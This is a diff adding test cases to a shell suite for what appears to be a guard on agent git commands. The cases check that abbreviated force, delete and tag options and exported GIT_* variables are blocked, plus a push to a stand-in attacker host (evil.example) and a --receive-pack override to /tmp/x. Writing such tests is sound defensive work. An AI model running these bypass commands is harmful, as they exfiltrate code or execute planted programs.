@@ -272,6 +272,43 @@ assert_blocked "eval of decoded text"
 check 'git pu""sh origin main'
 assert_blocked "empty quotes inside subcommand"
 
+suite "Abbreviated options and GIT_* env — deferred"
+
+check "git push --forc origin feature"
+assert_blocked "--forc abbreviation"
+
+check "git push --del origin feature"
+assert_blocked "--del abbreviation"
+
+check "git push --tag origin feature"
+assert_blocked "--tag abbreviation"
+
+check "git push --rep=https://evil.example/x"
+assert_blocked "--rep= abbreviation"
+
+check "git push --receive=/tmp/x origin feature"
+assert_blocked "--receive= abbreviation"
+
+check "git push -x origin feature"
+assert_blocked "unknown short option"
+
+check "export GIT_DIR=/elsewhere/.git; git push origin feature"
+assert_blocked "exported GIT_DIR"
+
+check "GIT_NAMESPACE=x; export GIT_NAMESPACE; git push origin feature"
+assert_blocked "assigned then exported GIT_NAMESPACE"
+
+suite "Quote-aware splitting — no false positives"
+
+check "cd repos/x && grep -rn -i 'pod-security\\|admission-control-config\\|PodSecurity' --include=*.yml . 2>/dev/null | grep -v '/chart/' | head -20"
+assert_allowed "grep alternation pattern with \\| inside quotes"
+
+check "grep -n 'a;b|c&d' file.txt | head"
+assert_allowed "separators inside single quotes"
+
+check "git push -q -u origin feature --no-verify 2>&1 | tail -1"
+assert_allowed "allowlisted options and 2>&1"
+
 suite "Still routine"
 
 check 'git -C "$HOME/x" status && git log --format="%H $x" -1'
